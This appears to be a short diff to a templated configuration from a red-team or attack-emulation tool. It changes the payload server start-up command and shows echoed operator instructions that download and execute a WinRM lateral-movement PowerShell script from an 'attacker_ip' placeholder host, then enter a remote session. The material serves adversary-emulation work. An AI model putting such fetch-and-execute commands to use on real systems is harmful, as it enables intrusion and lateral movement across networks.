@@ -26,4 +26,4 @@ content: |
   echo 'Deliver, save to disk & execute: iwr -uri http://{{ attacker_ip }}/lateral-movement-winrm.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-winrm.ps1; {{ delivery_path_windows }}\lateral-movement-winrm.ps1'; \
   echo 'Enter the session: Enter-PSSession <sessionId that is displayed>'; \
   echo '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
